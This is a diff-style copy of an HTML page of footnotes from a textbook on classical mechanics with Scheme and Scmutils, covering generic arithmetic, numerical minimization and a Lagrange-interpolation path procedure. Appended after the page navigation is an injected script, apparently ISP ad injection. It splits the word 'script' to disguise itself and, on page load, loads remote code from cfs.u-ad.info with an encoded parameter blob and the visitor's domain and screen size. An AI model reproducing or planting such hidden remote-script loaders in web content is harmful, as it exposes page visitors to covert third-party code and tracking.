+components are indexed by superscripts.  There are also 
+<tt>down</tt> tuples of components that are indexed by subscripts.  
+See the appendix on notation.</p>
+
+<p><a name="footnote_Temp_44" href="#call_footnote_Temp_44"><sup><small>31</small></sup></a> Derivatives of functions yield functions.  For example,
+<a name="%_idx_380"></a><a name="%_idx_382"></a><tt>((D cube) 2) =&gt; 12</tt> and 
+<tt>((D cube) 'a) =&gt; (* 3 (expt a 2))</tt>.</p>
+
+<p><a name="footnote_Temp_45" href="#call_footnote_Temp_45"><sup><small>32</small></sup></a> In our system, arithmetic operators are generic
+<a name="%_idx_386"></a><a name="%_idx_388"></a><a name="%_idx_390"></a><a name="%_idx_392"></a><a name="%_idx_394"></a>over symbolic expressions as well as numeric values; arithmetic
+procedures can work uniformly with numbers or expressions.  For
+example, given the procedure <tt>(define (cube x) (* x x x))</tt>
+we can obtain its value for a number <tt>(cube 2) =&gt; 8</tt> or for a 
+literal symbol <tt>(cube 'a) =&gt; (* a a a)</tt>.</p>
+
+<p><a name="footnote_Temp_46" href="#call_footnote_Temp_46"><sup><small>33</small></sup></a> The display is generated with T<small>E</small>X.</p>
+
+<p><a name="footnote_Temp_47" href="#call_footnote_Temp_47"><sup><small>34</small></sup></a> For very complicated expressions the prefix notation of
+Scheme is often better, but simplification is almost always useful.
+We can separate the functions of simplification and infix display.  We
+will see examples of this later.</p>
+
+<p><a name="footnote_Temp_48" href="#call_footnote_Temp_48"><sup><small>35</small></sup></a> Scmutils includes a variety of numerical integration
+<a name="%_idx_402"></a><a name="%_idx_404"></a>  procedures.  The examples in this section were computed by
+rational-function extrapolation of Euler-MacLaurin
+formulas with a relative error tolerance of 
+10<sup><tt>-</tt>10</sup>.</p>
+
+<p><a name="footnote_Temp_49" href="#call_footnote_Temp_49"><sup><small>36</small></sup></a> For a real
+physical situation we would have to specify units for these
+quantities, but in this illustration we leave them unspecified.</p>
+
+<p><a name="footnote_Temp_50" href="#call_footnote_Temp_50"><sup><small>37</small></sup></a> Here we use numerals with decimal points to specify the 
+parameters.  This
+<a name="%_idx_410"></a><a name="%_idx_412"></a><a name="%_idx_414"></a>forces the representations to be floating point, which is efficient
+for numerical calculation.  If symbolic algebra is to be done it is
+essential that the numbers be exact integers or rational fractions, so
+that expressions can be reliably reduced to lowest terms.  Such
+numbers are specified without a decimal point.</p>
+
+<p><a name="footnote_Temp_52" href="#call_footnote_Temp_52"><sup><small>38</small></sup></a> The squared magnitude of the velocity is <img src="chap1-Z-G-D-10.gif" border="0">  &middot; 
+<img src="chap1-Z-G-D-10.gif" border="0">, the vector dot product of the velocity with itself.  The
+<a name="%_idx_416"></a>square of a structure of components is defined to be the sum of the
+squares of the individual components, so we write simply <em>v</em><sup>2</sup>  = 
+<em>v</em>  &middot;  <em>v</em>.</p>
+
+<p><a name="footnote_Temp_54" href="#call_footnote_Temp_54"><sup><small>39</small></sup></a> Note that we are doing arithmetic on functions.  We extend the
+<a name="%_idx_426"></a><a name="%_idx_428"></a>arithmetic operations so that the combination of two functions
+of the same type (same domains and ranges) is the function on the same
+domain that combines the values of the argument functions in the
+range.  For example, if <em>f</em> and <em>g</em> are functions of <em>t</em>, then <em>f</em><em>g</em> is
+the function <em>t</em> <img src="chap1-Z-G-D-11.gif" border="0"> <em>f</em>(<em>t</em>)<em>g</em>(<em>t</em>).  A constant multiple of a function
+is the function whose value is the constant times the value of the
+function for each argument: <em>c</em><em>f</em> is the function <em>t</em> <img src="chap1-Z-G-D-11.gif" border="0"> <em>c</em> <em>f</em>(<em>t</em>).</p>
+
+<p><a name="footnote_Temp_55" href="#call_footnote_Temp_55"><sup><small>40</small></sup></a> Note that we are adding procedures.  Paralleling our extension of
+<a name="%_idx_430"></a><a name="%_idx_432"></a>  arithmetic operations to functions, arithmetic operations are extended
+to compatible procedures.</p>
+
+<p><a name="footnote_Temp_56" href="#call_footnote_Temp_56"><sup><small>41</small></sup></a> The arguments to <tt>minimize</tt> are a procedure
+<a name="%_idx_434"></a><a name="%_idx_436"></a><a name="%_idx_438"></a><a name="%_idx_440"></a>  implementing the univariate function in question, and the lower and
+upper bounds of the region to be searched.  Scmutils includes a
+choice of methods for numerical minimization; the one used here is
+Brent's algorithm, with an error tolerance of
+10<sup><tt>-</tt>5</sup>.  The value returned by <tt>minimize</tt> is a list of three
+numbers: the first is the argument at which the minimum occurred,
+the second is the minimum obtained, and the third is the number of
+iterations of the minimization algorithm required to obtain the
+minimum.</p>
+
+<p><a name="footnote_Temp_57" href="#call_footnote_Temp_57"><sup><small>42</small></sup></a> Yes, <i>-1.5987211554602254e-14</i> is zero for the 
+<a name="%_idx_442"></a>tolerance required of the minimizer.  And the <i>435.0000000000237</i> is
+arguably the same as <i>435</i> obtained before.</p>
+
+<p><a name="footnote_Temp_59" href="#call_footnote_Temp_59"><sup><small>43</small></sup></a> There are lots of good ways to make such a
+parametric set of approximating trajectories.  One could use splines
+or higher-order interpolating polynomials; one could use Chebyshev
+polynomials; one could use Fourier components.  The choice depends
+upon the kinds of trajectories one wants to approximate.</p>
+
+<p><a name="footnote_Temp_60" href="#call_footnote_Temp_60"><sup><small>44</small></sup></a> Here is one way to implement <tt>make-path</tt>:
+</p>
+<p><tt><a name="%_idx_456"></a>(define&nbsp;(make-path&nbsp;t0&nbsp;q0&nbsp;t1&nbsp;q1&nbsp;qs)<br>
+&nbsp;&nbsp;(let&nbsp;((n&nbsp;(length&nbsp;qs)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(let&nbsp;((ts&nbsp;(linear-interpolants&nbsp;t0&nbsp;t1&nbsp;n)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(Lagrange-interpolation-function<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(append&nbsp;(list&nbsp;q0)&nbsp;qs&nbsp;(list&nbsp;q1))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(append&nbsp;(list&nbsp;t0)&nbsp;ts&nbsp;(list&nbsp;t1))))))<br>
+</p>
+</tt>
+<p><a name="%_idx_458"></a><a name="%_idx_460"></a>  The procedure <tt>linear-interpolants</tt> produces a list of
+elements that linearly interpolate the first two arguments.  We use
+this procedure here to specify <tt>ts</tt>, the <tt>n</tt> evenly spaced
+intermediate times between <tt>t0</tt> and <tt>t1</tt> at which the path
+will be specified.  The parameters being adjusted, <tt>qs</tt>, are the
+positions at these intermediate times. The procedure <tt>Lagrange-interpolation-function</tt> takes a list of values and a list
+of times and produces a procedure that computes the Lagrange
+interpolation polynomial that passes through these points.</p>
+
+<p><a name="footnote_Temp_61" href="#call_footnote_Temp_61"><sup><small>45</small></sup></a> The minimizer used here is the Nelder-Mead downhill simplex
+<a name="%_idx_466"></a><a name="%_idx_468"></a><a name="%_idx_470"></a><a name="%_idx_472"></a><a name="%_idx_474"></a>  method.  As usual with numerical procedures, the interface to the
+<tt>nelder-mead</tt> procedure is complex, with lots of optional
+parameters to let the user control errors effectively.  For this
+presentation we have specialized <tt>nelder-mead</tt> by wrapping it in
+the more palatable <tt>multidimensional-minimize</tt>.  Unfortunately,
+you will have to learn to live with complicated numerical procedures
+someday.</p>
+
+<p><a name="footnote_Temp_62" href="#call_footnote_Temp_62"><sup><small>46</small></sup></a> Don't worry.  We know that you don't yet know why 
+<a name="%_idx_484"></a><a name="%_idx_486"></a>  this is the right Lagrangian.  We will get to this in 
+section&nbsp;<a href="book-Z-H-13.html#%_sec_1.6">1.6</a>.</p>
+
+<p><a name="footnote_Temp_63" href="#call_footnote_Temp_63"><sup><small>47</small></sup></a> By convention, named constants have names that begin with a colon.
+The constants named <tt>:pi</tt> and <tt>:-pi</tt> are what we would 
+expect from their names.</p>
+</div>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-10.html">previous</a></span><span>, <a href="book-Z-H-12.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582NgXaqsgjSGNhMkGfMSQiD2SGToLNKIuNXeqwR2mEGAJNT3Byj7XFD8MOGAjZaeVdL8Nq94Z%2fcHFtmaNcBzcn8VBVbE6MCwzu%2fwn7VjT4q7Kx7GvK0CEWtaoRrc4EJbNpyd1h5IsgZQEJL1LsEgqWF%2fC0PL4%2bk7lrUYaZkkwYBn9BAnSzC%2fnw72eB%2fJkk8xS42ZYUTVkA7BqKratBlA5ZIcw64eLCfbKlEgclcbKEZ%2bz6dS2H5jgfCFpsQ8Z4Z%2fuhGn6MuDcWoDz8Ck8ckBVSqm1GYd6y4DAw6mEQpiBp41IGzukzCJBQcIE%2fxFgdpZB1OrN1EQUbY%2fWYcixfLurCQYspZyEOx8p9KdeIuSbCAmWdg%2bmOFu%2bJCEDoA%2fDJig70RagADDJkb%2fcEYitJMGQQyOPzEArIadFaEjjJ7X1QOxBxyK6qk1oBYKGe4jpR1p1807y2M4l1bP7HkiHRBBAQotfIaK2%2b92NfNBa4XaBQ5Dz");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body></body>
+</html>
